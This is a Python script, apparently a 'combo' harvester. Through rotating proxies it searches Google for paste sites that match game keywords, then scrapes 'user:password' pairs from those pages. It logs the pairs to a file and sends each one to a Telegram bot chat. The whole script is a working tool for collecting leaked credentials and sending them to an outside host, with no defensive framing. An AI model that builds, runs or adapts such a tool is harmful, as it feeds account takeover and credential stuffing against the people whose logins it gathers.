import requests
import random
import json
import time
import re
from bs4 import BeautifulSoup
from proxy_scraper import get_proxies, get_random_proxy

# Load config
with open('config.json') as f:
    config = json.load(f)

BOT_TOKEN = config["BOT_TOKEN"]
CHAT_ID = config["CHAT_ID"]
SLEEP_MINUTES = config["SLEEP_MINUTES"]

# Load keywords
with open('keywords.json') as f:
    keywords = json.load(f)["games"]

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message
        }
        requests.post(url, data=data)
    except Exception as e:
        print(f"[Telegram] Error: {e}")

def google_search(keyword, proxy):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
        params = {
            "q": f"site:pastebin.com OR site:rentry.co OR site:ghostbin.com {keyword}",
            "num": "10"
        }
        response = requests.get("https://www.google.com/search", headers=headers, params=params, proxies=proxies, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        links = []
        for g in soup.find_all('a'):
            href = g.get('href')
            if href and ('pastebin.com' in href or 'rentry.co' in href or 'ghostbin.com' in href):
                clean_link = re.findall(r"https?://[^\s&]+", href)
                if clean_link:
                    links.append(clean_link[0])
        return list(set(links))
    except Exception as e:
        print(f"[Search] Error with proxy {proxy}: {e}")
        return []

def scrape_paste(url, proxy=None):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        } if proxy else None

        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
        if response.status_code == 200:
            matches = re.findall(r"[\w\.-]+:[\w\.-]+", response.text)
            return matches
        else:
            return []
    except Exception as e:
        print(f"[Scrape] Error fetching {url}: {e}")
        return []

def main():
    proxies = get_proxies()
    while True:
        all_found = []
        print(f"[+] Starting cycle with {len(proxies)} proxies...")

        for keyword in keywords:
            proxy = get_random_proxy(proxies)
            links = google_search(keyword, proxy)
            print(f"[+] Found {len(links)} links for keyword: {keyword}")

            for link in links:
                combos = scrape_paste(link, proxy)
                if combos:
                    print(f"[LIVE] {link} - Found {len(combos)} combos")
                    all_found.extend(combos)
                    for combo in combos:
                        send_telegram(combo)

        if all_found:
            with open("found_combos.txt", "a") as f:
                for combo in all_found:
                    f.write(combo + "\n")

            print(f"[+] Total combos saved: {len(all_found)}")
        else:
            print("[i] No new combos this cycle.")

        print(f"[i] Sleeping {SLEEP_MINUTES} minutes...")
        time.sleep(SLEEP_MINUTES * 60)

if __name__ == "__main__":
    main()
